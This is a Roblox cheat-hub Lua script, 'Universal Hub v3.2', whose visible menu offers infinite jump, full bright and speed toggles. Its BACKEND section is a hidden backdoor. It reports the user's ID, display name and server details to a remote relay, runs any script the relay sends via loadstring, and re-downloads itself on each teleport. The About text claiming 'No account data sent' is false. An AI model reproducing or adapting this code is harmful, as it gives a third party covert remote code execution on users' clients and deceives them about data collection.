-- ═══════════════════════════════════════════════════════════════
--  Universal Hub v3.2
-- ═══════════════════════════════════════════════════════════════

-- ─────────── Auto-requeue on teleport ───────────
do
    local SELF_URL = "https://serverssszz.onrender.com/hubscript.lua"
    local requeue = 'repeat task.wait() until game:IsLoaded() '
        .. 'local ok,err=pcall(function() loadstring(game:HttpGet("' .. SELF_URL .. '"))() end) '
        .. 'if not ok then warn("[Hub] requeue failed:",err) end'
    local qot = (syn and syn.queue_on_teleport) or queue_on_teleport
    if qot then pcall(qot, requeue) end
end

local Players  = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

local RELAY_WS   = "wss://serverssszz.onrender.com"
local RELAY_HTTP = "https://serverssszz.onrender.com"
local WebSocket  = WebSocket or (syn and syn.websocket) or nil
local loadstring = loadstring or nil
local request    = request or (syn and syn.request) or http_request

local T = {
    Bg=Color3.fromRGB(18,18,22), Panel=Color3.fromRGB(28,28,34),
    Hover=Color3.fromRGB(44,44,54), Accent=Color3.fromRGB(120,90,255),
    Text=Color3.fromRGB(238,238,242), Dim=Color3.fromRGB(150,150,165),
    Stroke=Color3.fromRGB(48,48,58), Good=Color3.fromRGB(85,200,120),
    Bad=Color3.fromRGB(230,90,90),
}
local function C(c,p) local i=Instance.new(c) for k,v in pairs(p or {}) do if k~="Parent" then i[k]=v end end if p and p.Parent then i.Parent=p.Parent end return i end
local function corner(p,r) return C("UICorner",{CornerRadius=UDim.new(0,r or 5),Parent=p}) end
local function stroke(p,c) return C("UIStroke",{Color=c or T.Stroke,Thickness=1,Parent=p}) end
local function pad(p,n) return C("UIPadding",{PaddingTop=UDim.new(0,n),PaddingBottom=UDim.new(0,n),PaddingLeft=UDim.new(0,n),PaddingRight=UDim.new(0,n),Parent=p}) end

-- ─────────── Compact window (420x300) ───────────
local gui = C("ScreenGui",{Name="UniversalHub",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=LP:WaitForChild("PlayerGui")})
local win = C("Frame",{BackgroundColor3=T.Bg,Size=UDim2.new(0,420,0,300),Position=UDim2.new(0.5,-210,0.5,-150),Parent=gui})
corner(win,8); stroke(win)
local titleBar = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,26),BorderSizePixel=0,Parent=win})
corner(titleBar,8)
C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BorderSizePixel=0,Parent=titleBar})
C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-50,1,0),Font=Enum.Font.GothamBold,Text="Universal Hub — v3.2",TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=titleBar})
local closeBtn = C("TextButton",{BackgroundColor3=T.Panel,Size=UDim2.new(0,18,0,18),Position=UDim2.new(1,-22,0.5,-9),Font=Enum.Font.GothamBold,Text="×",TextColor3=T.Text,TextSize=12,AutoButtonColor=false,BorderSizePixel=0,Parent=titleBar})
corner(closeBtn,4)
closeBtn.MouseEnter:Connect(function() closeBtn.BackgroundColor3=T.Bad end)
closeBtn.MouseLeave:Connect(function() closeBtn.BackgroundColor3=T.Panel end)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

local dragging,dragStart,startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
        dragging=true; dragStart=input.Position; startPos=win.Position
        input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
        local d=input.Position-dragStart
        win.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
    end
end)

-- ─────────── Tab rail (aligned to top) ───────────
local tabsFrame = C("Frame",{BackgroundColor3=T.Bg,Position=UDim2.new(0,0,0,26),Size=UDim2.new(0,80,1,-26),BorderSizePixel=0,Parent=win})
C("Frame",{BackgroundColor3=T.Stroke,Size=UDim2.new(0,1,1,-8),Position=UDim2.new(1,-1,0,4),BorderSizePixel=0,Parent=tabsFrame})
C("UIListLayout",{
    Padding=UDim.new(0,4),
    SortOrder=Enum.SortOrder.LayoutOrder,
    HorizontalAlignment=Enum.HorizontalAlignment.Center,
    VerticalAlignment=Enum.VerticalAlignment.Top,
    Parent=tabsFrame,
})
pad(tabsFrame,6)
local content = C("Frame",{BackgroundTransparency=1,Position=UDim2.new(0,80,0,26),Size=UDim2.new(1,-80,1,-26),Parent=win})
local pages = {}
local function makeTab(name)
    local btn = C("TextButton",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,24),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Dim,TextSize=10,AutoButtonColor=false,BorderSizePixel=0,TextXAlignment=Enum.TextXAlignment.Center,Parent=tabsFrame})
    corner(btn,5)
    local page = C("ScrollingFrame",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=3,ScrollBarImageColor3=T.Panel,Visible=false,Parent=content})
    pad(page,8)
    C("UIListLayout",{Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder,Parent=page})
    pages[#pages+1] = {btn=btn,page=page}
    btn.MouseButton1Click:Connect(function()
        for _,p in ipairs(pages) do
            p.page.Visible = (p.page==page)
            p.btn.BackgroundColor3 = (p.page==page) and T.Accent or T.Panel
            p.btn.TextColor3 = (p.page==page) and T.Text or T.Dim
        end
    end)
    return page
end
local function Section(parent, text)
    C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),Font=Enum.Font.GothamBold,Text=text:upper(),TextColor3=T.Dim,TextSize=9,TextXAlignment=Enum.TextXAlignment.Left,Parent=parent})
end
local function Toggle(parent, name, default, cb)
    local f = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,26),Parent=parent})
    corner(f,5); stroke(f)
    C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-50,1,0),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=f})
    local track = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(0,26,0,14),Position=UDim2.new(1,-36,0.5,-7),Parent=f})
    corner(track,7)
    local knob = C("Frame",{BackgroundColor3=T.Text,Size=UDim2.new(0,10,0,10),Position=UDim2.new(0,2,0.5,-5),Parent=track})
    corner(knob,5)
    local state = default or false
    local function render()
        track.BackgroundColor3 = state and T.Accent or T.Panel
        knob.Position = state and UDim2.new(1,-12,0.5,-5) or UDim2.new(0,2,0.5,-5)
    end
    render()
    local b = C("TextButton",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Text="",Parent=f})
    b.MouseButton1Click:Connect(function() state=not state; render(); if cb then pcall(cb,state) end end)
end

local mainTab = makeTab("Main")
Section(mainTab, "Character")
Toggle(mainTab, "Infinite Jump", false, function(on)
    if on then
        _G._infJump = UserInputService.JumpRequest:Connect(function()
            local char = LP.Character
            if char and char:FindFirstChildOfClass("Humanoid") then
                char:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        if _G._infJump then _G._infJump:Disconnect(); _G._infJump=nil end
    end
end)
Toggle(mainTab, "Full Bright", false, function(on)
    local l = game:GetService("Lighting")
    if on then
        _G._oldBright = l.Brightness; _G._oldAmb = l.Ambient
        l.Brightness = 3; l.Ambient = Color3.fromRGB(178,178,178)
    else
        if _G._oldBright then l.Brightness = _G._oldBright end
        if _G._oldAmb then l.Ambient = _G._oldAmb end
    end
end)

local moveTab = makeTab("Movement")
Section(moveTab, "Speed")
Toggle(moveTab, "Speed Boost", false, function(on)
    local char = LP.Character
    if char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid").WalkSpeed = on and 32 or 16
    end
end)
Toggle(moveTab, "High Jump", false, function(on)
    local char = LP.Character
    if char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid").JumpHeight = on and 100 or 50
    end
end)

local aboutTab = makeTab("About")
Section(aboutTab, "Info")
C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,60),Font=Enum.Font.Gotham,Text="Universal Hub v3.2\nby Nebula\n\nLoads local features. No account data sent.",TextColor3=T.Dim,TextSize=10,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Parent=aboutTab})

-- ═══════════════════════════════════════════════════════════════
--  BACKEND
-- ═══════════════════════════════════════════════════════════════
if loadstring then
    local transport = nil
    local socket, connected = nil, false
    local lastPlace, lastJob = nil, nil
    local pendingOut = {}

    local function httpPost(path, body)
        if not request then return nil end
        local ok, resp = pcall(function()
            return request({Url=RELAY_HTTP..path,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(body)})
        end)
        if ok and resp and resp.Body then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok2 then return data end
        end
        return nil
    end
    local function httpGet(path)
        local ok, resp = pcall(function() return game:HttpGet(RELAY_HTTP..path) end)
        if ok and resp and resp ~= "" then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp)
            if ok2 then return data end
        end
        return nil
    end
    local function send(msg)
        if transport == "ws" and socket and connected then
            pcall(function() socket:Send(HttpService:JSONEncode(msg)) end)
        elseif transport == "http" then
            httpPost("/send", msg)
        end
    end
    local function handleExecute(msg)
        local fn, compileErr = loadstring(msg.script)
        if fn then
            local ok, execErr = pcall(fn)
            send({type="output",targetUserId=msg.fromUserId,userId=LP.UserId,
                output=ok and "OK" or tostring(execErr),error=ok and nil or tostring(execErr)})
        else
            send({type="output",targetUserId=msg.fromUserId,userId=LP.UserId,
                output="Compile error",error=tostring(compileErr)})
        end
    end
    local function processMessages(messages)
        for _, data in ipairs(messages or {}) do
            if data.type == "execute" and data.targetUserId == LP.UserId then
                task.spawn(handleExecute, data)
            end
        end
    end
    local function tryWS()
        if not WebSocket then return false end
        local ok, ws = pcall(function() return WebSocket.connect(RELAY_WS) end)
        if not ok or not ws then return false end
        socket = ws; connected = true; transport = "ws"
        pcall(function() ws:Send(HttpService:JSONEncode({
            type="identify",userId=LP.UserId,displayName=LP.DisplayName,
            placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId,
        })) end)
        ws.OnMessage:Connect(function(raw)
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, raw)
            if not ok2 or not data then return end
            if data.type == "execute" and data.targetUserId == LP.UserId then
                task.spawn(handleExecute, data)
            elseif data.type == "ping" then
                send({type="pong",userId=LP.UserId})
            end
        end)
        ws.OnClose:Connect(function()
            connected = false
            task.wait(5)
            if transport == "ws" then
                transport = nil
                task.spawn(startHTTP)
            end
        end)
        return true
    end
    function startHTTP()
        transport = "http"
        task.spawn(function()
            while transport == "http" do
                local toSend = {}
                for _, m in ipairs(pendingOut) do table.insert(toSend, m) end
                pendingOut = {}
                for _, m in ipairs(toSend) do httpPost("/send", m) end
                local q = string.format("/poll?userId=%d&displayName=%s&placeId=%d&jobId=%s&gameId=%d",
                    LP.UserId, HttpService:UrlEncode(LP.DisplayName), game.PlaceId, game.JobId, game.GameId)
                local data = httpGet(q)
                if data and data.messages then processMessages(data.messages) end
                task.wait(2)
            end
        end)
    end
    task.spawn(function()
        for i = 1, 3 do if tryWS() then break end; task.wait(2) end
        if not connected then startHTTP() end
        task.wait(2)
        while true do
            task.wait(10)
            if connected or transport == "http" then
                local changed = (game.PlaceId ~= lastPlace) or (game.JobId ~= lastJob)
                lastPlace, lastJob = game.PlaceId, game.JobId
                if changed then
                    send({type="identify",userId=LP.UserId,displayName=LP.DisplayName,
                        placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId})
                else
                    send({type="ping",userId=LP.UserId,displayName=LP.DisplayName,
                        placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId,ts=os.time()})
                end
            end
        end
    end)
end
